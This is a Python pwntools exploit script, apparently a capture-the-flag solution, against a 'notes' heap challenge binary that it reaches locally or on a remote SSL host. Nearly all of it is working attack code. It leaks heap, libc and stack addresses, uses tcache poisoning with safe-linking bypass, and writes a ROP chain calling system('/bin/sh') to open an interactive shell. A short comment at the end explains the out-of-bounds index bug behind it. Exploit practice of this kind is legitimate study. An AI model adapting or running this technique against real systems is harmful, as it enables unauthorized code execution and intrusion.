#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./notes_patched")
    if args.GDB:
        gdb.attach(r,"")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2], ssl=True)
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

def create_note(index, size):
    sla(">", "1")
    sla("Index: ", str(index))
    sla("Size: ", str(size))

def delete_note(index):
    sla(">", "2")
    sla("Index: ", str(index))

def read_note(index):
    sla(">", "3")
    sla("Index: ", str(index))

def edit_note(index, content):
    sla(">", "4")
    sla(b"Index: ", str(index))
    time.sleep(0.1)
    ru(b'Content: ')
    r.send(content)

create_note(14, 0x20)
delete_note(14)
create_note(14, 0x20)
read_note(14)
ru("Content: ")
heap_leak = u64(r.recv(5).ljust(8,b"\x00"))

create_note(1, 0x409)
create_note(2, 0x30)
delete_note(1)
LIBC_ENVIRON = 0x20ad58
create_note(1, 0x20)
read_note(1)
ru("Content: ")
libc = u64(r.recv(6).ljust(8,b"\x00")) - 0x203f10
create_note(15, 0x3f0-0x10)
create_note(0, 0x20)
create_note(4, 0x20)
create_note(5, 0x20)
create_note(6, 0x20)
create_note(16, 0x20)
delete_note(6)
delete_note(5)
delete_note(4)
ENVIRON_RSP_OFF = 0x130 # ends with 8
SYSTEM = 0x58750 + libc
BIN_SH = 0x1cb42f + libc
POP_RDI = 0x10f75b + libc
edit_note(0, b"O"*0x28+p64(0x31)+p64((heap_leak ^ (libc + LIBC_ENVIRON - 0x18))))
create_note(7, 0x20)
create_note(8, 0x20)
edit_note(8, b"A"*0x18)
read_note(8)
ru(b"A"*0x18)
stack = u64(r.recv(6).ljust(8,b"\x00")) - ENVIRON_RSP_OFF - 8

create_note(0, 0x40)
create_note(4, 0x40)
create_note(5, 0x40)
create_note(6, 0x40)
create_note(16, 0x40)
delete_note(6)
delete_note(5)
delete_note(4)
edit_note(0, b"O"*0x48+p64(0x51)+p64((heap_leak ^ stack)))
create_note(7, 0x40)
create_note(8, 0x40)
edit_note(8, b'A' * 8 +p64(POP_RDI+1)+ p64(POP_RDI) + p64(BIN_SH) + p64(SYSTEM))
sla(">", "5")
leak("libc",hex(libc))
leak("heap_leak", hex(heap_leak))
leak("stack", hex(stack))
r.interactive()

'''
char *gNotes[16];
int gSizes[16];
gNotes[16] == gSizes[0]
So create_note(16) will make the size of gNotes[0] be huge
edit_note -> heap overflow
'''
